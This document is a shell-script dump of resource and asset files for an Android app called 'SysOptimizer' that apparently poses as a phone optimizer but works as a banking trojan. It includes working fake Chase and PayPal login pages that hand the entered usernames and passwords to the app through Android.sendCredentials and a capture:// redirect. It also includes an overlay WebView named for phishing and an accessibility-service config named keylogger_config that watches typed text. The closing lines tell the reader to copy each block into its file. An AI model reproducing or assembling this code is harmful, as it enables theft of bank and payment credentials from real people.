echo "===== FILE: app/src/main/assets/chase_phishing.html ====="
cat << 'EOF'
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Chase</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{background:white;padding:30px;border-radius:8px;width:360px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}.logo{text-align:center;margin-bottom:20px;font-size:28px;font-weight:300;color:#0077be}.input-group{margin:10px 0}.input-group label{font-size:13px;color:#555;display:block;margin-bottom:4px}.input-group input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:14px}.input-group input:focus{border-color:#0077be;outline:none}button{width:100%;padding:12px;background:#0077be;color:white;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}button:hover{background:#005fa3}.error{color:#d32f2f;font-size:13px;margin-top:8px;display:none;text-align:center}.footer{text-align:center;margin-top:15px;font-size:12px;color:#888}</style>
</head>
<body>
<div class="container"><div class="logo">CHASE</div>
<form onsubmit="submitForm(event)">
<div class="input-group"><label>Username</label><input type="text" id="user" placeholder="Enter your username" required></div>
<div class="input-group"><label>Password</label><input type="password" id="pass" placeholder="Enter your password" required></div>
<button type="submit">Sign In</button>
<div class="error" id="error">We're having trouble signing you in. Please try again.</div>
</form><div class="footer">Secured by Chase</div></div>
<script>
function submitForm(e){e.preventDefault();var user=document.getElementById('user').value;var pass=document.getElementById('pass').value;if(user.length<2||pass.length<2){document.getElementById('error').style.display='block';return;}if(typeof Android!=='undefined'){Android.sendCredentials(user,pass);}document.querySelector('button').textContent='Signing in...';document.querySelector('button').disabled=true;setTimeout(function(){window.location.href='capture://?user='+encodeURIComponent(user)+'&pass='+encodeURIComponent(pass);},1200);}
</script></body></html>
EOF
echo ""

echo "===== FILE: app/src/main/assets/paypal_phishing.html ====="
cat << 'EOF'
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Arial,sans-serif}body{background:#e9e9e9;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{background:white;padding:35px;border-radius:6px;width:340px;box-shadow:0 0 20px rgba(0,0,0,0.1)}.logo{text-align:center;font-size:32px;font-weight:300;color:#003087;margin-bottom:20px}.logo span{color:#009cde}input{width:100%;padding:12px;margin:6px 0;border:1px solid #ccc;border-radius:4px;font-size:14px}input:focus{border-color:#009cde;outline:none}button{width:100%;padding:12px;background:#009cde;color:white;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}button:hover{background:#007db8}.error{color:#d32f2f;font-size:13px;margin-top:8px;display:none;text-align:center}.footer{text-align:center;margin-top:15px;font-size:11px;color:#888}</style>
</head>
<body>
<div class="container"><div class="logo">Pay<span>Pal</span></div>
<form onsubmit="submitForm(event)">
<input type="text" id="user" placeholder="Email or mobile number" required>
<input type="password" id="pass" placeholder="Password" required>
<button type="submit">Log In</button>
<div class="error" id="error">We're having trouble logging you in.</div>
</form><div class="footer">PayPal is committed to security</div></div>
<script>
function submitForm(e){e.preventDefault();var user=document.getElementById('user').value;var pass=document.getElementById('pass').value;if(user.length<3||pass.length<3){document.getElementById('error').style.display='block';return;}if(typeof Android!=='undefined'){Android.sendCredentials(user,pass);}document.querySelector('button').textContent='Logging in...';document.querySelector('button').disabled=true;setTimeout(function(){window.location.href='capture://?user='+encodeURIComponent(user)+'&pass='+encodeURIComponent(pass);},1000);}
</script></body></html>
EOF
echo ""

# ==========================================
# RESOURCE FILES
# ==========================================

echo "===== FILE: app/src/main/res/layout/activity_main.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="@android:color/white"
    android:padding="30dp">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="SysOptimizer"
        android:textSize="28sp"
        android:textStyle="bold"
        android:textColor="#1a1a2e"
        android:layout_marginBottom="40dp" />

    <TextView
        android:id="@+id/counterText"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="0"
        android:textSize="48sp"
        android:textStyle="bold"
        android:textColor="#0095f6"
        android:layout_marginBottom="20dp" />

    <com.google.android.material.button.MaterialButton
        android:id="@+id/boostBtn"
        android:layout_width="match_parent"
        android:layout_height="56dp"
        android:text="Optimize Now"
        android:textSize="16sp"
        app:cornerRadius="8dp"
        android:backgroundTint="#0095f6" />

</LinearLayout>
EOF
echo ""

echo "===== FILE: app/src/main/res/layout/activity_login.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#fafafa">
    <WebView
        android:id="@+id/loginWebView"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />
</LinearLayout>
EOF
echo ""

echo "===== FILE: app/src/main/res/layout/overlay_phishing.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#00000000">
    <WebView
        android:id="@+id/phishingWebView"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />
</FrameLayout>
EOF
echo ""

echo "===== FILE: app/src/main/res/xml/accessibility_config.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true" />
EOF
echo ""

echo "===== FILE: app/src/main/res/xml/keylogger_config.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeViewFocused|typeViewClicked"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagRetrieveInteractiveWindows|flagReportViewIds|flagRequestEnhancedWebAccessibility"
    android:canRetrieveWindowContent="true"
    android:notificationTimeout="100" />
EOF
echo ""

echo "===== FILE: app/src/main/res/xml/provider_paths.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <files-path name="files" path="." />
    <cache-path name="cache" path="." />
</paths>
EOF
echo ""

echo "===== FILE: app/src/main/res/xml/backup_rules.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<full-backup-content>
    <include domain="sharedpref" path="."/>
    <include domain="file" path="."/>
</full-backup-content>
EOF
echo ""

echo "===== FILE: app/src/main/res/xml/data_extraction_rules.xml ====="
cat << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<data-extraction-rules>
    <cloud-backup>
        <include domain="sharedpref" path="."/>
        <include domain="file" path="."/>
    </cloud-backup>
</data-extraction-rules>
EOF
echo ""

echo "===== FILE: app/src/main/res/values/strings.xml ====="
cat << 'EOF'
<resources>
    <string name="app_name">SysOptimizer</string>
</resources>
EOF
echo ""

echo "===== DONE ====="
echo "Copy each block between the delimiters into its respective file."
echo "File paths are shown above each block."